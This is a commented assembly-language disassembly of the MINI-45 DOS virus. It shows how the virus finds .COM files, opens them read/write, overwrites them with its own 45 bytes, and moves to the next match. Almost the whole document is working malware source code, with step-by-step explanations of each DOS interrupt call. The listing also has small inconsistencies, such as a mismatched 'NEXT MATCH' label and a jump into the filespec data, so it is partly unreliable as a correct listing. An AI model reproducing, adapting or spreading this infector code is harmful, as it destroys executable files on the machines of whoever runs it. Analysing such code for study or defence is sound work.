;***************************************************************
;             DISASSEMBLY of the MINI-45 VIRUS
;***************************************************************
;         FIND .COM FILE TO INFECT
;***************************************************************
     MOV DX, 127h          ;filehandle search criteria-27bytes
                           ;away from beg. of file
     MOV AH, 4Eh           ;setup for Dos function-find file
     INT 21h               ;search for first file match
     JB  FILESPEC          ;jump below and return
;****************************************************************
;         OPEN FILE
;****************************************************************
FIRST_FILE:
     MOV DX, 009Eh         ;pointer to asciiz file spec
     MOV AX, 3D02h         ;moving 3d into ah=call dos to open file
                           ;moving 02 into al=we want read\write
                           ;access
     INT 21h               ;call dos function and open file.
                           ;file handle found is put in ax register
     JB  NEXT_MATCH        ;search for next match
;****************************************************************
;        WRITE VIRUS CODE TO FILE
;****************************************************************
     XCHG AX,BX            ;put retrieved file handle from 3d open
                           ;call into bx so it can be used for 
                           ;write function.
     MOV DX, 0100h         ;point to buffer of data to write, i.e.
                           ;to myself
     MOV CX, 002Dh         ;#of bytes to write. 45d bytes
     MOV AH, 40h           ;setup write to file dos function
     INT 21h               ;write to file indicated in bx
;******************************************************************
;        CLOSE FILE
;******************************************************************
     MOV AH, 3Eh           ;setup for dos function to close file
     INT 21h               ;close file
;******************************************************************
;       FIND NEXT FILE MATCH
;******************************************************************
NEXT MATCH:
     MOV AH, 4Fh           ;search for next file match
     JMP FIRST_FILE        ;return above
;******************************************************************
; 
FILESPEC:
     db '*.com'
     db 00

